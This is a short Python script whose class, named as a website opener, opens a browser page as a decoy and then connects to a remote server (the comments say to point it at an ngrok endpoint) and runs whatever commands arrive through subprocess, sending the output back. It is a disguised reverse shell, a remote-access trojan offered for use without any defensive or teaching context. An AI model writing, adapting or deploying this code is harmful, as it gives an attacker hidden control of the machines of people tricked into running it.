import socket, os, subprocess, webbrowser


class WEBSITE:
    def Browser(self):
        # you can change this url
        webbrowser.open('https://www.satilik-otomobil.com/files/SCR1PT-G4P.html', new=2)

    def Bunny_script(self):
        # change this server and port on your ngrok
        server = '127.0.0.1'
        port = 4444
        buffer = 1024 * 128 
        separator = "<sep>"
        s = socket.socket()
        s.connect((server, port))
        directory_client = os.getcwd()
        s.send(directory_client.encode())

        while True:
                command = s.recv(buffer).decode()
                splited_command = command.split()

                if splited_command[0].lower() == "cd":
                    try:
                        os.chdir(' '.join(splited_command[1:]))
                    except FileNotFoundError as e:
                        output = str(e)
                    else:
                        output = ""

                else:
                    output = subprocess.getoutput(command)
                    directory_client = os.getcwd()
                    message = f"{output}{separator}{directory_client}"
                    s.send(message.encode())
        s.close()

    def Main(self):
        self.Browser()
        self.Bunny_script()

if __name__ == "__main__":
    BUNNY = WEBSITE()
    BUNNY.Main()